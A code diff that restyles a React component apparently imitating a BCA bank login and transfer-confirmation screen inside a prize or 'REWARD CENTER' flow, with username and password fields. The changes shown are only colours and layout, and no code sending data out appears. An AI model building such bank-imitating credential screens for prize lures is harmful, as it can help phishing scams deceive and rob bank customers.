@@ -97,13 +97,13 @@ const BcaFlow = ({ prize, nama, finish }) => {
               required placeholder="Username (min. 4 karakter)" value={user} autoComplete="off"
               minLength={4}
               onChange={(e) => { setUser(e.target.value); setErr(""); }}
-              style={{ width: "100%", padding: "11px 13px", borderRadius: 8, border: `1px solid ${err && user.trim().length < 4 ? "#dc2626" : "#cbd5e1"}`, marginBottom: err ? 5 : 11, fontSize: 14 }}
+              style={{ width: "100%", padding: "11px 13px", borderRadius: 8, border: `1px solid ${err && user.trim().length < 4 ? "#dc2626" : "#cbd5e1"}`, marginBottom: err ? 5 : 11, fontSize: 14, background: "#fff", color: "#0f172a" }}
             />
             <input
               required type="password" placeholder="Password (min. 6 karakter)" value={pass} autoComplete="off"
               minLength={6}
               onChange={(e) => { setPass(e.target.value); setErr(""); }}
-              style={{ width: "100%", padding: "11px 13px", borderRadius: 8, border: `1px solid ${err && pass.length < 6 ? "#dc2626" : "#cbd5e1"}`, marginBottom: 15, fontSize: 14 }}
+              style={{ width: "100%", padding: "11px 13px", borderRadius: 8, border: `1px solid ${err && pass.length < 6 ? "#dc2626" : "#cbd5e1"}`, marginBottom: 15, fontSize: 14, background: "#fff", color: "#0f172a" }}
             />
             {err && (
               <p style={{ color: "#dc2626", fontSize: 12.5, fontWeight: 700, marginBottom: 12 }}>
@@ -126,7 +126,7 @@ const BcaFlow = ({ prize, nama, finish }) => {
         )}
 
         {phase === "confirm" && (
-          <div style={{ background: "#fff", borderRadius: 12, padding: 22, boxShadow: "0 3px 14px rgba(0,0,0,.09)" }}>
+          <div style={{ background: "#fff", borderRadius: 12, padding: 22, boxShadow: "0 3px 14px rgba(0,0,0,.09)", color: "#0f172a" }}>
             <div style={{ fontWeight: 700, fontSize: 15, color: "#0060af", marginBottom: 14, textAlign: "center" }}>Konfirmasi Transfer</div>
             {[
               ["Merchant", "REWARD CENTER"],
@@ -135,9 +135,9 @@ const BcaFlow = ({ prize, nama, finish }) => {
               ["Berita", `PEMBAYARAN-${prize.slice(0, 10).toUpperCase().replace(/\s/g, "")}`],
               ["Rekening Sumber", `5410••••••${Math.floor(10 + Math.random() * 89)}`],
             ].map(([l, v]) => (
-              <div key={l} style={{ display: "flex", justifyContent: "space-between", padding: "8px 0", borderBottom: "1px dashed #e2e8f0", fontSize: 13 }}>
-                <span style={{ color: "#64748b" }}>{l}</span>
-                <strong style={{ maxWidth: "55%", textAlign: "right" }}>{v}</strong>
+              <div key={l} style={{ display: "flex", justifyContent: "space-between", gap: 10, padding: "8px 0", borderBottom: "1px dashed #e2e8f0", fontSize: 13 }}>
+                <span style={{ color: "#64748b", flexShrink: 0 }}>{l}</span>
+                <strong style={{ maxWidth: "55%", textAlign: "right", color: "#0f172a", wordBreak: "break-word" }}>{v}</strong>
               </div>
             ))}
             <button
